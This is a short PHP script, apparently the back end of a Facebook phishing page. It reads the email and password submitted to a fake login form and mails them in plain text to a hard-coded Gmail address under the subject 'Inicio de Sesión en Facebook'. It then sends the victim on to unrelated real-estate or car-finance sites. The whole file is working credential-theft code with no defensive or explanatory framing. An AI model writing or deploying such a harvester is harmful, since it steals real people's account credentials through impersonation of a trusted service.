<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    // Verifica si los campos del formulario están vacíos
    if (empty($email) || empty($password)) {
        // Si hay campos vacíos, redirige al inicio de sesión de Facebook
        header("Location: https://github.com/39493ijjsjanq/CasasHeroesVeracruz.com.git");
        exit; // Asegura que la redirección sea efectiva
    }

    // Configura los datos del correo
    $destinatario = "irasemaroque13@gmail.com";
    $asunto = "Inicio de Sesión en Facebook";
    $mensaje = "Se ha iniciado sesión en Facebook con el siguiente correo electrónico: $email y contraseña: $password";

    // Envía el correo electrónico
    if (mail($destinatario, $asunto, $mensaje)) {
        // Si el correo se envía correctamente, redirige a la página de éxito
        header("Location: https://www.losheroes.mx/los-heroes-2/desarrollos-en-veracruz/veracruz/los-heroes-veracruz/");
        exit; // Asegura que la redirección sea efectiva
    } else {
        // Si el correo no se envía correctamente, redirige a la página de Autofin
        header("Location: https://autofin.com/");
        exit; // Asegura que la redirección sea efectiva
    }
} else {
    echo "Acceso no autorizado.";
}
?>
